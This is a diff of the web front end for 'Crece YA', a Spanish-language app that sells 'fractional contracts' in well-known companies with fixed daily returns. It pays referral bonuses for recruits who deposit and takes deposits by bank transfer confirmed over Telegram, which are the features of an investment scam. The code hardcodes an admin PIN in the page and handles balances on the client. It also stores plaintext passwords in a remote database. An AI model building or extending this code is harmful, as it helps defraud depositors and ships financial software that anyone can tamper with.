-                <h3 class="font-bold text-slate-900 text-sm leading-none text-main">${p.name}</h3>
-                <span class="text-[10px] text-slate-400 font-mono text-sub">Contrato Fraccional</span>
+                <h3 class="font-bold text-slate-900 text-xs leading-none">${p.name}</h3>
+                <span class="text-[9px] text-slate-400 font-mono">Contrato Fraccional</span>
               </div>
             </div>
-            <span class="text-xs font-mono font-bold px-2.5 py-0.5 rounded-md text-white" style="background-color: ${p.color}">
+            <span class="text-[10px] font-mono font-bold px-2 py-0.5 rounded-md text-white" style="background-color: ${p.color}">
               ${p.days} Días
             </span>
           </div>
 
-          <div class="subbox-theme grid grid-cols-2 gap-2 text-xs font-mono bg-slate-50 p-2.5 rounded-xl border border-slate-100">
+          <div class="grid grid-cols-2 gap-2 text-[11px] font-mono bg-slate-50 p-2 rounded-xl border border-slate-100">
             <div>
-              <span class="text-slate-400 block text-[10px] text-sub">DIVIDENDO DIARIO</span>
+              <span class="text-slate-400 block text-[9px]">DIVIDENDO DIARIO</span>
               <strong class="text-sky-700 font-bold">+$${fmt(p.daily)} ARS/d</strong>
             </div>
             <div>
-              <span class="text-slate-400 block text-[10px] text-sub">TOTAL AL CIERRE</span>
-              <strong class="text-slate-900 font-bold text-main">$${fmt(p.total)} ARS</strong>
+              <span class="text-slate-400 block text-[9px]">TOTAL AL CIERRE</span>
+              <strong class="text-slate-900 font-bold">$${fmt(p.total)} ARS</strong>
             </div>
           </div>
 
-          <div class="flex justify-between text-xs text-slate-400 font-mono pt-0.5 text-sub">
+          <div class="flex justify-between text-[10px] text-slate-400 font-mono pt-0.5">
             <span>Quedan ${p.slotsLeft} de ${p.slotsTotal} cupos</span>
             <span class="text-sky-600 font-bold">Ronda 1</span>
           </div>
 
-          <button onclick="handlePlanClick('${p.id}')" ${yaAdquirido ? 'disabled' : ''} class="w-full py-2.5 ${btnStyle} font-black text-xs rounded-xl transition shadow flex items-center justify-center gap-1 cursor-pointer">
+          <button onclick="handlePlanClick('${p.id}')" class="w-full py-2.5 ${p.btnBg} font-extrabold text-xs rounded-xl transition shadow flex items-center justify-center gap-1">
             ${btnLabel}
           </button>
         `;
@@ -1219,17 +768,6 @@
       const p = plans.find(item => item.id === planId);
       if (!p) return;
 
-      const yaLoTiene = appState.activePlans && appState.activePlans.some(plan => 
-        (plan.plan_code === p.id || plan.id === p.id || plan.name === p.name) && !plan.completed && (plan.endTime > Date.now())
-      );
-
-      if (yaLoTiene) {
-        alert(`Límite por cuenta alcanzado: Ya posees el plan ${p.name} en operación. Selecciona otra acción del mercado o aguarda a que finalice tu ciclo.`);
-        return;
-      }
-
-      await sincronizarSaldoServidor();
-
       if (appState.balance >= p.cost) {
         if (confirm(`¿Confirmas activar ${p.name} por $${fmt(p.cost)} ARS de tu saldo?`)) {
           appState.balance -= p.cost;
@@ -1238,7 +776,6 @@
 
           appState.activePlans.push({
             id: contractId,
-            plan_code: p.id,
             name: p.name,
             cost: p.cost,
             total: p.total,
@@ -1248,13 +785,14 @@
             completed: false
           });
 
-          saveLocal();
-
-          await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { 
-            balance: appState.balance,
-            active_plans: appState.activePlans
+          appState.txs.unshift({
+            desc: `Activación ${p.name}`,
+            amount: -p.cost,
+            date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
           });
 
+          saveLocal();
+          syncWithSupabase(false);
           alert(`¡Plan activado con éxito! Monitorea el conteo en "Productos".`);
           switchTab('productos');
         }
@@ -1263,18 +801,17 @@
       }
     };
 
-    // FORMATO DE CRONÓMETRO CORREGIDO (DÍAS + HORAS + MINUTOS)
     function renderProducts() {
       const container = document.getElementById('active-products-container');
       if (!container) return;
       container.innerHTML = '';
 
-      if (!appState.activePlans || appState.activePlans.length === 0) {
+      if (appState.activePlans.length === 0) {
         container.innerHTML = `
-          <div class="card-theme p-6 bg-white border border-sky-100 rounded-2xl text-center space-y-2">
-            <i class="fa-solid fa-folder-open text-sky-300 text-4xl"></i>
-            <p class="text-xs text-slate-500 font-medium text-sub">No posees contratos bursátiles activos.</p>
-            <button onclick="switchTab('planes')" class="px-4 py-2 bg-sky-600 text-white rounded-xl text-xs font-bold shadow cursor-pointer">
+          <div class="p-6 bg-white border border-sky-100 rounded-2xl text-center space-y-2">
+            <i class="fa-solid fa-folder-open text-sky-300 text-3xl"></i>
+            <p class="text-xs text-slate-500 font-medium">No posees contratos bursátiles activos.</p>
+            <button onclick="switchTab('planes')" class="px-4 py-1.5 bg-sky-600 text-white rounded-xl text-xs font-bold shadow">
               Explorar Mercado
             </button>
           </div>
@@ -1283,101 +820,109 @@
       }
 
       const now = Date.now();
-      let huboLiberacion = false;
-
-      appState.activePlans.forEach((plan) => {
+      appState.activePlans.forEach(async (plan, index) => {
         const remaining = plan.endTime - now;
-        const isEnded = remaining <= 0 || plan.completed;
 
         if (remaining <= 0 && !plan.completed) {
           plan.completed = true;
           appState.balance += plan.total;
-          huboLiberacion = true;
+          appState.txs.unshift({
+            desc: `Liquidación ${plan.name}`,
+            amount: plan.total,
+            date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+          });
+          saveLocal();
+          syncWithSupabase(false);
+          alert(`¡Ciclo culminado! Se acreditaron $${fmt(plan.total)} ARS a tu balance.`);
+          return;
         }
 
-        let statusBadge = '<span class="text-xs font-mono text-emerald-700 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-md font-bold">En Operación</span>';
-        let timeDisplay = '';
+        const totalHours = Math.floor(Math.max(0, remaining) / (1000 * 60 * 60));
+        const days = Math.floor(totalHours / 24);
+        const hours = totalHours % 24;
+        const minutes = Math.floor((Math.max(0, remaining) % (1000 * 60 * 60)) / (1000 * 60));
+        const seconds = Math.floor((Math.max(0, remaining) % (1000 * 60)) / 1000);
 
-        if (isEnded) {
-          statusBadge = '<span class="text-xs font-mono text-sky-700 bg-sky-50 border border-sky-200 px-2 py-0.5 rounded-md font-bold">Ciclo Completado ✓</span>';
-          timeDisplay = '<span class="font-mono font-bold text-emerald-600 text-xs">Rendimientos acreditados</span>';
+        let timeStr = "";
+        if (days > 0) {
+          timeStr = `${days}d ${hours}h ${minutes}m ${seconds}s`;
         } else {
-          const d = Math.floor(remaining / (1000 * 60 * 60 * 24));
-          const h = Math.floor((remaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-          const m = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
-          const s = Math.floor((remaining % (1000 * 60)) / 1000);
-          const dText = d > 0 ? `${d}d ` : '';
-          timeDisplay = `<span class="font-mono font-bold text-sky-800 text-sm">${dText}${h}h ${m}m ${s}s</span>`;
+          timeStr = `${hours.toString().padStart(2, '0')}h ${minutes.toString().padStart(2, '0')}m ${seconds.toString().padStart(2, '0')}s`;
         }
 
         const card = document.createElement('div');
-        card.className = "card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-xs space-y-2.5";
+        card.className = "p-3.5 bg-white border border-sky-200 rounded-2xl shadow-xs space-y-2";
         card.innerHTML = `
           <div class="flex justify-between items-center">
             <div class="flex items-center gap-2">
-              <img src="${plan.logo}" class="w-6 h-6 object-contain">
-              <h4 class="font-bold text-sm text-slate-900 text-main">${plan.name}</h4>
+              <img src="${plan.logo || './meli.png'}" onerror="this.src='./meli.png'" class="w-6 h-6 object-contain">
+              <h4 class="font-bold text-xs text-slate-900">${plan.name}</h4>
             </div>
-            ${statusBadge}
+            <span class="text-[10px] font-mono ${plan.completed ? 'text-blue-700 bg-blue-50 border-blue-200' : 'text-emerald-700 bg-emerald-50 border-emerald-200'} border px-2 py-0.5 rounded-md font-bold">
+              ${plan.completed ? 'Completado ✓' : 'En Operación'}
+            </span>
           </div>
-          <div class="subbox-theme grid grid-cols-2 gap-2 text-xs font-mono bg-slate-50 p-2.5 rounded-xl border border-slate-100">
+          <div class="grid grid-cols-2 gap-2 text-[11px] font-mono bg-slate-50 p-2 rounded-xl border border-slate-100">
             <div>
-              <span class="text-slate-400 block text-[10px] text-sub">INVERSIÓN</span>
-              <strong class="text-slate-800 text-main">$${fmt(plan.cost)} ARS</strong>
+              <span class="text-slate-400 block text-[9px]">INVERSIÓN</span>
+              <strong class="text-slate-800">$${fmt(plan.cost)} ARS</strong>
             </div>
             <div>
-              <span class="text-slate-400 block text-[10px] text-sub">TOTAL AL CIERRE</span>
+              <span class="text-slate-400 block text-[9px]">TOTAL AL CIERRE</span>
               <strong class="text-sky-700 font-bold">$${fmt(plan.total)} ARS</strong>
             </div>
           </div>
           <div class="flex items-center justify-between text-xs pt-1">
-            <span class="text-slate-400 font-mono text-sub">Estado:</span>
-            ${timeDisplay}
+            <span class="text-slate-400 text-[10px] font-mono">Tiempo restante:</span>
+            <span class="font-mono font-bold text-sky-800">${plan.completed ? '00h 00m 00s' : timeStr}</span>
           </div>
         `;
         container.appendChild(card);
       });
-
-      if (huboLiberacion) {
-        saveLocal();
-        if (appState.phone) {
-          supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { 
-            balance: appState.balance,
-            active_plans: appState.activePlans
-          });
-        }
-      }
     }
     setInterval(renderProducts, 1000);
 
-    // CHECK-IN SINCRONIZADO
     document.getElementById('btn-claim-daily').addEventListener('click', async () => {
       const now = Date.now();
       if (now - appState.lastClaim < 24 * 60 * 60 * 1000) {
-        const remainingHours = Math.ceil((24 * 60 * 60 * 1000 - (now - appState.lastClaim)) / (1000 * 60 * 60));
-        alert(`Ya cobraste tu bono diario. Podrás reclamar nuevamente en ${remainingHours} horas.`);
+        alert("Ya cobraste tu bono de hoy.");
         return;
       }
       appState.balance += 500;
       appState.lastClaim = now;
-      saveLocal();
-      renderUI();
-      await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { 
-        balance: appState.balance,
-        last_claim: now 
+      appState.txs.unshift({
+        desc: "Bono Check-in Diario",
+        amount: 500,
+        date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
       });
-      alert("¡+$500 ARS acreditados con éxito a tu saldo!");
+      saveLocal();
+      syncWithSupabase(false);
+      alert("¡+$500 ARS acreditados a tu saldo!");
     });
+
+    function updateCheckinCooldown() {
+      const now = Date.now();
+      const diff = 24 * 60 * 60 * 1000 - (now - appState.lastClaim);
+      const btn = document.getElementById('btn-claim-daily');
+      const text = document.getElementById('checkin-status-text');
+
+      if (diff > 0) {
+        const h = Math.floor(diff / (1000 * 60 * 60));
+        const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+        const s = Math.floor((diff % (1000 * 60)) / 1000);
+        btn.innerText = "✓ Cobrado";
+        btn.className = "px-3 py-1 bg-slate-200 text-slate-400 text-xs font-bold rounded-xl cursor-not-allowed";
+        text.innerText = `Próximo reclamo en: ${h}h ${m}m ${s}s`;
+      } else {
+        btn.innerText = "Cobrar";
+        btn.className = "px-3.5 py-1.5 bg-amber-400 hover:bg-amber-300 text-slate-950 text-xs font-extrabold rounded-xl transition shadow";
+        text.innerText = "+$500 ARS listos para reclamar";
+      }
+    }
+    setInterval(updateCheckinCooldown, 1000);
 
     window.openWalletModal = function(mode) {
       document.getElementById('wallet-modal').classList.remove('hidden');
-      
-      const destNameEl = document.getElementById('withdraw-dest-name');
-      const destCvuEl = document.getElementById('withdraw-dest-cvu');
-      if (destNameEl && appState.name) destNameEl.value = appState.name;
-      if (destCvuEl && appState.cvu) destCvuEl.value = appState.cvu;
-
-      cancelarRevisionRetiro();
       setWalletMode(mode);
     };
     window.closeWalletModal = () => document.getElementById('wallet-modal').classList.add('hidden');
@@ -1389,15 +934,17 @@
       const boxRet = document.getElementById('wallet-retiro-box');
 
       if (mode === 'recargar') {
-        btnRec.className = "py-2.5 rounded-lg bg-sky-500 text-slate-950 font-bold transition cursor-pointer";
-        btnRet.className = "py-2.5 rounded-lg text-slate-400 hover:text-white font-bold transition cursor-pointer";
-        boxRec.style.display = 'block';
-        boxRet.style.display = 'none';
+        btnRec.className = "py-2 rounded-lg bg-sky-500 text-slate-950 transition";
+        btnRet.className = "py-2 rounded-lg text-slate-400 hover:text-white transition";
+        boxRec.classList.remove('hidden');
+        boxRet.classList.add('hidden');
       } else {
-        btnRet.className = "py-2.5 rounded-lg bg-sky-500 text-slate-950 font-bold transition cursor-pointer";
-        btnRec.className = "py-2.5 rounded-lg text-slate-400 hover:text-white font-bold transition cursor-pointer";
-        boxRec.style.display = 'none';
-        boxRet.style.display = 'block';
+        btnRet.className = "py-2 rounded-lg bg-sky-500 text-slate-950 transition";
+        btnRec.className = "py-2 rounded-lg text-slate-400 hover:text-white transition";
+        boxRet.classList.remove('hidden');
+        boxRec.classList.add('hidden');
+        if (appState.cvu) document.getElementById('withdraw-custom-cvu').value = appState.cvu;
+        if (appState.name) document.getElementById('withdraw-custom-holder').value = appState.name;
       }
     };
 
@@ -1405,55 +952,41 @@
       navigator.clipboard.writeText("0000168300000008340656").then(() => {
         const btn = document.getElementById('btn-copy-cvu');
         btn.innerText = "¡Copiado! ✓";
-        setTimeout(() => { btn.innerText = "Copiar"; }, 1500);
+        btn.className = "px-2.5 py-1 bg-emerald-500 text-slate-950 text-[10px] font-black rounded-lg transition shrink-0";
+        setTimeout(() => {
+          btn.innerText = "Copiar";
+          btn.className = "px-2.5 py-1 bg-sky-600 text-white text-[10px] font-black rounded-lg transition shrink-0";
+        }, 1500);
       });
     };
 
     window.setDepositValue = (v) => document.getElementById('deposit-custom-input').value = v;
 
     window.notifyDepositTelegram = async function() {
-      const btn = document.getElementById('btn-notify-deposit');
-      const inputEl = document.getElementById('deposit-custom-input');
-      const val = parseFloat(inputEl.value);
-
-      if (isNaN(val) || val < 2000) {
-        alert("El monto mínimo obligatorio de recarga es de $2.000 ARS. No se permiten valores menores.");
-        inputEl.value = 2000;
+      const val = parseFloat(document.getElementById('deposit-custom-input').value) || 2000;
+      if (val < 2000) {
+        alert("El monto mínimo de recarga es de $2.000 ARS.");
         return;
       }
-
-      btn.disabled = true;
-      btn.innerText = "Registrando solicitud...";
-
       appState.pending += val;
       saveLocal();
 
-      const solicitudItem = {
-        user_phone: appState.phone || 'Usuario Anónimo',
-        user_name: appState.name || 'Usuario Crece YA',
-        amount: val,
-        status: 'pendiente',
-        type: 'recarga'
-      };
-
-      try {
-        await supabaseRequest('solicitudes', 'POST', solicitudItem);
-      } catch(err) {
-        console.warn("Fallo al guardar en Supabase:", err);
+      if (supabase) {
+        try {
+          await supabase.from('solicitudes').insert({
+            user_phone: appState.phone,
+            user_name: appState.name || 'Sin nombre',
+            type: 'recarga',
+            amount: val,
+            net_amount: val,
+            status: 'pendiente'
+          });
+        } catch(e) { console.warn(e); }
       }
 
-      try {
-        let localQueue = JSON.parse(localStorage.getItem('cy_solicitudes_queue') || '[]');
-        localQueue.unshift({ ...solicitudItem, id: 'LOC-' + Date.now(), created_at: new Date().toISOString() });
-        localStorage.setItem('cy_solicitudes_queue', JSON.stringify(localQueue));
-      } catch(e) {}
-
-      btn.disabled = false;
-      btn.innerHTML = '<i class="fa-brands fa-telegram text-base"></i> Notificar y Enviar Comprobante';
-
+      syncWithSupabase(false);
+      window.open('https://t.me/+7obUJU1X2sg0NGEx', '_blank');
       closeWalletModal();
-      window.open('https://t.me/+gROOyK5OfpI5MTQx', '_blank');
-      alert("¡Solicitud registrada con éxito! El administrador verificará tu comprobante.");
     };
 
     window.setWithdrawValue = function(v) {
@@ -1470,120 +1003,80 @@
       document.getElementById('withdraw-net-calc').innerText = `$${fmt(net)} ARS`;
     }
 
-    window.prepararConfirmacionRetiro = function() {
+    window.confirmWithdrawAction = async function() {
       const now = Date.now();
       if (now - appState.lastWithdraw < 24 * 60 * 60 * 1000) {
-        alert("Límite operativo alcanzado: Solo se permite 1 solicitud de retiro cada 24 hs.");
+        alert("Límite diario alcanzado: Solo se permite 1 solicitud de retiro cada 24 hs.");
         return;
       }
-
+      const cvu = document.getElementById('withdraw-custom-cvu').value.trim();
+      const holder = document.getElementById('withdraw-custom-holder').value.trim();
+      if (cvu.length < 22) {
+        alert("Por favor ingresa un CBU o CVU válido de 22 dígitos.");
+        return;
+      }
+      if (!holder) {
+        alert("Por favor ingresa el nombre del titular de la cuenta de destino.");
+        return;
+      }
       const amt = parseFloat(withdrawInput.value);
       if (isNaN(amt) || amt < 5000) {
-        alert("El monto mínimo de extracción bancaria es de $5.000 ARS. Por favor ingresa $5.000 o más.");
-        withdrawInput.value = 5000;
-        calcWithdrawNet();
+        alert("El monto mínimo de retiro bancario es de $5.000 ARS.");
         return;
       }
-
       if (amt > appState.balance) {
-        alert(`Saldo disponible insuficiente. Tienes $${fmt(appState.balance)} ARS y solicitaste $${fmt(amt)} ARS.`);
+        alert("Saldo disponible insuficiente.");
         return;
       }
-
-      const destName = document.getElementById('withdraw-dest-name').value.trim();
-      const destCvu = document.getElementById('withdraw-dest-cvu').value.trim().replace(/\D/g, '');
-
-      if (!destName || destName.length < 3) {
-        alert("Por favor ingresa el nombre y apellido completo del titular bancario.");
-        return;
-      }
-
-      if (!destCvu || destCvu.length < 10) {
-        alert("Por favor ingresa un CBU o CVU personal válido (de 10 a 22 dígitos).");
-        return;
-      }
-
-      const net = amt * 0.90;
-      document.getElementById('review-dest-name').innerText = destName;
-      document.getElementById('review-dest-cvu').innerText = destCvu;
-      document.getElementById('review-dest-net').innerText = `$${fmt(net)} ARS`;
-
-      document.getElementById('withdraw-step-input').classList.add('hidden');
-      document.getElementById('withdraw-step-confirm').classList.remove('hidden');
-      document.getElementById('withdraw-fund-pass').value = '';
-      document.getElementById('withdraw-fund-pass').focus();
-    };
-
-    window.cancelarRevisionRetiro = function() {
-      const stepInput = document.getElementById('withdraw-step-input');
-      const stepConfirm = document.getElementById('withdraw-step-confirm');
-      if (stepInput && stepConfirm) {
-        stepConfirm.classList.add('hidden');
-        stepInput.classList.remove('hidden');
-      }
-    };
-
-    window.ejecutarRetiroFinal = async function() {
       const pass = document.getElementById('withdraw-fund-pass').value;
-
-      if (!pass) {
-        alert("Por favor ingresa tu contraseña para confirmar la extracción.");
+      if (!pass || pass !== appState.pass) {
+        alert("Contraseña de cuenta incorrecta.");
         return;
       }
 
-      if (pass !== appState.pass) {
-        alert("La contraseña ingresada es incorrecta. Verifica tu clave de acceso a la cuenta.");
-        return;
-      }
-
-      const amt = parseFloat(withdrawInput.value);
-      const destName = document.getElementById('withdraw-dest-name').value.trim();
-      const destCvu = document.getElementById('withdraw-dest-cvu').value.trim().replace(/\D/g, '');
-      const netAmount = amt * 0.90;
-      const now = Date.now();
-
-      appState.name = destName || appState.name;
-      appState.cvu = destCvu;
       appState.balance -= amt;
       appState.withdrawn += amt;
       appState.lastWithdraw = now;
-      appState.lastWithdrawNet = netAmount;
-      saveLocal();
+      appState.cvu = cvu;
+      appState.name = holder;
 
-      await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { 
-        balance: appState.balance,
-        withdrawn: appState.withdrawn,
-        name: appState.name,
-        cvu: appState.cvu,
-        last_withdraw: now
+      appState.txs.unshift({
+        desc: `Retiro Bancario (${holder})`,
+        amount: -amt,
+        date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
       });
 
-      const retiroItem = {
-        user_phone: appState.phone,
-        user_name: destName,
-        amount: amt,
-        net_amount: netAmount,
-        cvu: destCvu,
-        status: 'pendiente',
-        type: 'retiro'
-      };
+      saveLocal();
 
-      try {
-        await supabaseRequest('solicitudes', 'POST', retiroItem);
-      } catch(err) {
-        console.warn("Fallo al guardar retiro en Supabase:", err);
+      if (supabase) {
+        try {
+          await supabase.from('solicitudes').insert({
+            user_phone: appState.phone,
+            user_name: holder,
+            type: 'retiro',
+            amount: amt,
+            net_amount: amt * 0.9,
+            status: 'pendiente'
+          });
+        } catch(e) { console.warn(e); }
       }
 
-      try {
-        let localQueue = JSON.parse(localStorage.getItem('cy_solicitudes_queue') || '[]');
-        localQueue.unshift({ ...retiroItem, id: 'LOC-W-' + Date.now(), created_at: new Date().toISOString() });
-        localStorage.setItem('cy_solicitudes_queue', JSON.stringify(localQueue));
-      } catch(e) {}
-
-      alert(`¡Solicitud de retiro por $${fmt(amt)} ARS recibida! Transferiremos $${fmt(netAmount)} ARS a tu cuenta en horario bancario.`);
-      cancelarRevisionRetiro();
+      syncWithSupabase(false);
+      alert("Solicitud de retiro registrada exitosamente. Se liquidará en horario bancario oficial (07:00 a 18:00 hs).");
       closeWalletModal();
     };
+
+    const myRefUrl = `${window.location.origin}${window.location.pathname}?ref=${appState.phone || '11482019'}`;
+    document.getElementById('ref-link-input').value = myRefUrl;
+
+    document.getElementById('btn-copy-ref').addEventListener('click', () => {
+      navigator.clipboard.writeText(myRefUrl).then(() => alert("¡Enlace copiado al portapapeles!"));
+    });
+
+    document.getElementById('btn-share-whatsapp').addEventListener('click', () => {
+      const msg = encodeURIComponent(`¿Alguna vez pensaste en ser dueño de las plataformas que usás todos los días? 📱 Ahora podés con Crece YA: desde solo $2.000 ARS adquirís fracciones de Mercado Libre, TikTok, Apple o Spotify con rendimientos diarios directos en pesos ⚡ Registrate desde mi enlace asegurado y empezá hoy: ${myRefUrl}`);
+      window.open(`https://api.whatsapp.com/send?text=${msg}`, '_blank');
+    });
 
     document.getElementById('prof-name-input').value = appState.name;
     document.getElementById('prof-cvu-input').value = appState.cvu;
@@ -1591,59 +1084,11 @@
 
     document.getElementById('btn-save-profile').addEventListener('click', async () => {
       appState.name = document.getElementById('prof-name-input').value.trim();
-      appState.cvu = document.getElementById('prof-cvu-input').value.trim().replace(/\D/g, '');
+      appState.cvu = document.getElementById('prof-cvu-input').value.trim();
       appState.alias = document.getElementById('prof-alias-input').value.trim();
       saveLocal();
-
-      if (appState.phone) {
-        await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', {
-          name: appState.name,
-          cvu: appState.cvu,
-          alias: appState.alias
-        });
-      }
+      syncWithSupabase(false);
       alert("Datos bancarios guardados con éxito.");
-    });
-
-    document.getElementById('btn-change-pass').addEventListener('click', async () => {
-      const oldPass = document.getElementById('prof-old-pass').value;
-      const newPass = document.getElementById('prof-new-pass').value;
-      const confirmPass = document.getElementById('prof-new-pass-confirm').value;
-
-      if (!oldPass || !newPass || !confirmPass) {
-        alert("Por favor completa todos los campos de contraseña.");
-        return;
-      }
-
-      if (oldPass !== appState.pass) {
-        alert("La contraseña actual es incorrecta.");
-        return;
-      }
-
-      if (newPass !== confirmPass) {
-        alert("La nueva contraseña y su confirmación no coinciden.");
-        return;
-      }
-
-      if (newPass.length < 4) {
-        alert("La contraseña debe tener al menos 4 caracteres.");
-        return;
-      }
-
-      appState.pass = newPass;
-      saveLocal();
-
-      if (appState.phone) {
-        await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', {
-          pass: newPass
-        });
-      }
-
-      document.getElementById('prof-old-pass').value = '';
-      document.getElementById('prof-new-pass').value = '';
-      document.getElementById('prof-new-pass-confirm').value = '';
-
-      alert("¡Contraseña actualizada con éxito en el servidor!");
     });
 
     let logoClicks = 0;
@@ -1657,351 +1102,63 @@
 
     window.closeAdminModal = () => document.getElementById('admin-modal').classList.add('hidden');
 
-    window.bloquearConsolaAdmin = function() {
-      document.getElementById('admin-dashboard-box').classList.add('hidden');
-      document.getElementById('admin-auth-box').classList.remove('hidden');
-      document.getElementById('admin-pin-input').value = '';
-    };
-
     document.getElementById('btn-admin-unlock').addEventListener('click', () => {
       if (document.getElementById('admin-pin-input').value === "161928") {
         document.getElementById('admin-auth-box').classList.add('hidden');
         document.getElementById('admin-dashboard-box').classList.remove('hidden');
-        cargarSolicitudesAdmin();
       } else {
         alert("Clave maestra incorrecta.");
       }
     });
 
-    window.copiarTextoRapido = function(txt, btn) {
-      navigator.clipboard.writeText(txt).then(() => {
-        const prev = btn.innerText;
-        btn.innerText = "¡Copiado!";
-        setTimeout(() => btn.innerText = prev, 1500);
-      });
-    };
+    document.getElementById('btn-admin-credit').addEventListener('click', async () => {
+      const amt = parseFloat(document.getElementById('admin-credit-amount').value) || 0;
+      if (amt <= 0) return;
+      appState.balance += amt;
+      if (appState.pending >= amt) appState.pending -= amt;
+      saveLocal();
+      syncWithSupabase(false);
+      alert(`$${fmt(amt)} ARS acreditados.`);
+      closeAdminModal();
+    });
 
-    window.cargarSolicitudesAdmin = async function() {
-      const container = document.getElementById('admin-deposits-list');
-      container.innerHTML = '<p class="text-xs text-sky-400 text-center py-6">Consultando solicitudes en vivo...</p>';
+    document.getElementById('btn-admin-validate-guest').addEventListener('click', async () => {
+      appState.balance += 1000;
+      appState.invites.push({ phone: "+54 9 11 ... 402", status: "Validado ✓" });
+      saveLocal();
+      syncWithSupabase(false);
+      alert("Invitado validado (+ $1.000 ARS al patrocinador).");
+      closeAdminModal();
+    });
 
-      let list = [];
-      try {
-        const data = await supabaseRequest('solicitudes?status=eq.pendiente');
-        if (Array.isArray(data)) list = data;
-      } catch(e) {}
+    document.getElementById('btn-admin-liquidate-w').addEventListener('click', async () => {
+      appState.withdrawn += 5000;
+      saveLocal();
+      syncWithSupabase(false);
+      alert("Retiro liquidado exitosamente.");
+      closeAdminModal();
+    });
 
-      try {
-        const localQueue = JSON.parse(localStorage.getItem('cy_solicitudes_queue') || '[]');
-        localQueue.filter(item => item.status === 'pendiente').forEach(lItem => {
-          if (!list.some(s => String(s.id) === String(lItem.id))) {
-            list.push(lItem);
-          }
-        });
-      } catch(e) {}
-
-      if (list.length === 0) {
-        container.innerHTML = '<p class="text-xs text-slate-400 text-center py-8">No hay operaciones pendientes por revisar.</p>';
-        return;
-      }
-
-      container.innerHTML = list.map(item => {
-        const timeStr = item.created_at ? new Date(item.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'Reciente';
-        const isRetiro = item.type === 'retiro';
-        const tipoBadge = isRetiro 
-          ? '<span class="text-[10px] font-mono px-2 py-0.5 rounded-md bg-rose-500/20 text-rose-300 font-bold border border-rose-500/30">RETIRO A PAGAR</span>' 
-          : '<span class="text-[10px] font-mono px-2 py-0.5 rounded-md bg-emerald-500/20 text-emerald-300 font-bold border border-emerald-500/30">RECARGA ENTRANTE</span>';
-
-        const extraInfo = isRetiro 
-          ? `<div class="bg-[#091522] p-2 rounded-xl border border-slate-700/60 flex items-center justify-between text-[11px] font-mono mt-1">
-              <span class="text-slate-300 truncate">CVU: <strong class="text-amber-400">${item.cvu || 'No provisto'}</strong></span>
-              <button onclick="copiarTextoRapido('${item.cvu}', this)" class="px-2 py-0.5 bg-slate-700 hover:bg-slate-600 text-slate-200 text-[10px] rounded cursor-pointer shrink-0 ml-1">Copiar</button>
-            </div>
-            <p class="text-[11px] font-mono text-emerald-400 font-bold pt-1">Neto a transferir: $${fmt(item.net_amount || item.amount * 0.9)} ARS</p>` 
-          : `<p class="text-[10px] font-mono text-slate-400 pt-0.5">Transferencia Recibida</p>`;
-
-        return `
-          <div class="p-3.5 rounded-2xl bg-[#13283f] border ${isRetiro ? 'border-rose-500/50' : 'border-sky-800/70'} shadow-md space-y-2 text-left">
-            <div class="flex justify-between items-start">
-              <div>
-                <div class="flex items-center gap-2">
-                  <h4 class="font-bold text-white text-xs leading-tight">${item.user_name || 'Usuario Crece YA'}</h4>
-                  ${tipoBadge}
-                </div>
-                <span class="text-[11px] text-sky-300 font-mono block mt-0.5">${item.user_phone}</span>
-              </div>
-              <span class="font-bold ${isRetiro ? 'text-rose-400' : 'text-sky-400'} font-mono text-sm">$${fmt(item.amount)} ARS</span>
-            </div>
-
-            <div class="flex justify-between items-center text-[10px] text-sky-300/70 font-mono border-t border-slate-800 pt-1.5">
-              <span>${timeStr}</span>
-              <span>${item.cvu ? 'CVU Personal' : 'Comprobante CVU'}</span>
-            </div>
-
-            ${extraInfo}
-
-            <div class="grid grid-cols-2 gap-2 pt-1">
-              <button onclick="cancelarDeposito('${item.id}', '${item.user_phone}', ${item.amount}, '${item.type || 'recarga'}')" class="w-full py-2 bg-rose-600/20 hover:bg-rose-600 text-rose-300 hover:text-white font-bold text-xs rounded-xl border border-rose-500/40 transition cursor-pointer">
-                ✕ Rechazar
-              </button>
-              <button onclick="aprobarDeposito('${item.id}', '${item.user_phone}', ${item.amount}, '${item.type || 'recarga'}')" class="w-full py-2 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-xs rounded-xl transition shadow cursor-pointer">
-                ✓ ${isRetiro ? 'Liquidar Retiro' : 'Acreditar Saldo'}
-              </button>
-            </div>
-          </div>
-        `;
-      }).join('');
-    };
-
-    window.auditarBonosAdmin = async function() {
-      if (!confirm("¿Deseas auditar y sincronizar los bonos de referidos en toda la base de datos?")) return;
-      
-      const allUsers = await supabaseRequest('usuarios?select=*');
-      if (!Array.isArray(allUsers)) {
-        alert("No se pudo conectar con el servidor.");
-        return;
-      }
-
-      let actualizados = 0;
-      for (const rec of allUsers) {
-        const phoneClean = (rec.phone || '').replace(/\D/g, '').slice(-10);
-        if (!phoneClean) continue;
-
-        const oficiales = allUsers.filter(u => {
-          if (!u.invited_by) return false;
-          const uRefClean = String(u.invited_by).replace(/\D/g, '').slice(-10);
-          const uPhoneClean = (u.phone || '').replace(/\D/g, '').slice(-10);
-          const isDeposit = u.has_deposited === true || parseFloat(u.balance || 0) >= 2000;
-          return isDeposit && uRefClean === phoneClean && uPhoneClean !== phoneClean;
-        }).length;
-
-        let bonoTotal = 0;
-        if (oficiales >= 100) bonoTotal = 100000;
-        else if (oficiales >= 50) bonoTotal = 60000;
-        else if (oficiales >= 40) bonoTotal = 30000;
-        else if (oficiales >= 20) bonoTotal = 15000;
